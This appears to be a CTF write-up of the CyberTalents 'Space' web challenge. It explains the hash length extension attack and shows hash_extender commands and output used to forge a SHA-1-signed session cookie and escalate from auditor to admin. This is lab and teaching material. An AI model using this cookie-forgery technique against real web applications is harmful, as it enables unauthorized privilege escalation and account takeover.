---
title: Cybertalents Spcae Web Challenge Writeup
author: Muhammad Adel
date: 2021-08-12 18:20:00 +0200
categories: [Cybertalents Writeups]
tags: [cybertalents, ctf, web]
---
## **Description**

you might need some space XD.
**Difficulty:** Hard 
**Challenge Link:**[ http://3.126.138.80/catch/http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/space/](http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/space/)


## **Solution**

### **Exploring**

Opening the challenge we will stumble upon an almost empty web page with only one word "HI!".

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYZH8y3c5MSSAgkhzW%2F1.png?alt=media&token=fbcd67ac-9a8b-46d3-a9e0-33737cd56df8)

There is nothing on the source page. So I thinks we should do some directory brute force.

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYZudLVILsFWUA4cHZ%2F2.png?alt=media&token=2700ca62-997a-4283-8f13-a082e7a6aed7)

As we see in the image there is a login page that might need some creds to be logged in. I tried to login with some default creds and also some SQL injection attacks but nothing works :(

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYa3Zs4v4DDsLj-6o3%2F4.png?alt=media&token=cc510d1a-f07d-4253-ac21-64f58ce20b94)

Also there is a robots.txt file when I went to it I found this path:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfY_ZepRyY9yk-n9LRG%2F3.png?alt=media&token=ade6f477-b16e-41c4-bb30-4c96fc736ecf)

I tried to go to this path but it gives me 404 Not Found. Hmm! I thought for a while why not to try this path as credential `auditor:auditor` and it works!!

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYai9U560NtEhYy5BB%2F5.png?alt=media&token=5f834e03-50e0-46ac-b5da-1850f5845bcc)

But the bad news is there is nothing at all after login in. it is just a dummy page with one image. I tried to take this pic and run some stegno tools on it but with no luck. I get stuck here and I took hint from one of the mods and he told me " Length extension attack"! but what the heck is this?

### **Length Extension Attack**

> In cryptography and computer security, a length extension attack is a type of attack where an attacker can use Hash(message1) and the length of message1 to calculate Hash(message1 ‖ message2) for an attacker-controlled message2, without needing to know the content of message1. Algorithms like MD5, SHA-1 and most of SHA-2 that are based on the Merkle--Damgård construction are susceptible to this kind of attack.[1][2][3] Truncated versions of SHA-2, including SHA-384 and SHA256/512 are not susceptible,[4] nor is the SHA-3 algorithm.
> *source:*<https://en.wikipedia.org/wiki/Length_extension_attack>

Let's explain it more by an example:

-   let `secret = "secret"`
-   let `data = "data"`
-   let `H = md5()`
-   let `signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b`
-   let `append = "append"`

The server sends `data` and `signature` to the attacker. The attacker guesses that `H` is MD5 simply by its length (it's the most common 128-bit hashing algorithm), based on the source, or the application's specs, or any way they are able to. Knowing only `data`, `H`, and `signature`, the attacker's goal is to append `append` to `data` and generate a valid signature for the new data.

When calculating `H`(`secret` + `data`), the string (`secret` + `data`) is padded with a '1' bit and some number of '0' bits, followed by the length of the string. That is, in hex, the padding is a 0x80 byte followed by some number of 0x00 bytes and then the length. The number of 0x00 bytes, the number of bytes reserved for the length, and the way the length is encoded, depends on the particular algorithm and blocksize.

With most algorithms (including MD4, MD5, RIPEMD-160, SHA-0, SHA-1, and SHA-256), the string is padded until its length is congruent to 56 bytes (mod 64). Or, to put it another way, it's padded until the length is 8 bytes less than a full (64-byte) block (the 8 bytes being size of the encoded length field). There are two hashes implemented in hash_extender that don't use these values: SHA-512 uses a 128-byte blocksize and reserves 16 bytes for the length field, and WHIRLPOOL uses a 64-byte blocksize and reserves 32 bytes for the length field.

The endianness of the length field is also important. MD4, MD5, and RIPEMD-160 are little-endian, whereas the SHA family and WHIRLPOOL are big-endian. Trust me, that distinction cost me days of work!

In our example, `length(secret || data) = length("secretdata")` is 10 (0x0a) bytes, or 80 (0x50) bits. So, we have 10 bytes of data (`"secretdata"`), 46 bytes of padding (80 00 00 ...), and an 8-byte little-endian length field (50 00 00 00 00 00 00 00), for a total of 64 bytes (or one block). Put together, it looks like this:


```
0000  73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00  secretdata......
0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0030  00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00  ........P.......
```
Breaking down the string, we have:
-   `"secret" = secret`
-   `"data" = data`
-   80 00 00 ... -- The 46 bytes of padding, starting with 0x80
-   50 00 00 00 00 00 00 00 -- The bit length in little endian

This is the exact data that `H` hashed in the original example. source: <https://github.com/iagox86/hash_extender>

### **Exploitation**

It seems a headache for me to understand all of these things if you are like me don't worry I am going to explain it more. what are really need in this attack is a message and signature to be able to create a new altered message with the data that we want.

Now, let's back to our challenge after login in it seems that we have been assigned a cookie:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYe7Cf-ci8lc0K1sIG%2F6.png?alt=media&token=35ae29d9-a425-4b4d-85d1-31b1f061bf0e)

so we have two parameters the session and signature. the session parameter is hex based one and the signature is SHA-1 which is vulnerable to this attack:
```
757365723d61756469746f7226726f6c653d61756469746f72 >> user=auditor&role=auditor
```
I tried to edit this session it will give a message:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYenWzi-89ZEbsdCM7%2F7.png?alt=media&token=d017a950-3ead-4d3d-8974-20efb928065a)

So here I think we need to utilize the Length Extension attack to edit the session and procedure a valid signature. the good news is that there pre-built tool to help us preform this attack:
[https://github.com/iagox86/hash_extender](https://github.com/iagox86/hash_extender)

Great let's download it and build it and then look for the right options.

```bash
root@kali:~/CTF/CyberTalent/WEB/Space/hash_extender# ./hash_extender
hash_extender: --data or --file is required

--------------------------------------------------------------------------------
HASH EXTENDER
--------------------------------------------------------------------------------

By Ron Bowes <ron @ skullsecurity.net>

See LICENSE.txt for license information.

Usage: ./hash_extender <--data=<data>|--file=<file>> --signature=<signature> --format=<format> [options]
The arguments you probably want to give are (see above for more details):
-d <data>
-s <original signature>
-a <data to append>
-f <hash format>
-l <length of secret>
```

After reading again about the attack I concluded that we need to pass the data, original signature, data to append, hash format and the length of the secret. So it might be something like that:

```bash
 ./hash_extender -d 'user=auditor&role=auditor' -s '9cdc8cbee716e38a1549f52a797fc4466e826097' -a 'admin' -f 'sha1' -l ??
```
‌
Hmm! there is still one thing missing which is the length of the secret How we are going to find it maybe mentioned in the web page. I took a lot for me to figure it out it seems that we need to append ~ delta sigh after `index.php` to find the length:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYgxGgWy-dMMe5AYQe%2F8.png?alt=media&token=e9a38b4f-5c79-4b75-a149-ba303d079229)

Now, everything looks neat let's run our attack.
```bash
root@kali:~/CTF/CyberTalent/WEB/Space/hash_extender# ./hash_extender -d 'user=auditor&role=auditor' -s '9cdc8cbee716e38a1549f52a797fc4466e826097' -a 'admin' -f 'sha1' -l 38
Type: sha1
Secret length: 38
New signature: e2467f09b8e23ffee8c16196222dc25995044589
New string: 757365723d61756469746f7226726f6c653d61756469746f7280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001f861646d696e
```
‌Let's edit our Cookie and **Bingo!**

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MfYYRY9TA4fXvMXfjnb%2F-MfYhPst6wcW2ns9UbZR%2F9.png?alt=media&token=6b10bf57-7d16-43f8-b00c-7ee7f26f153e)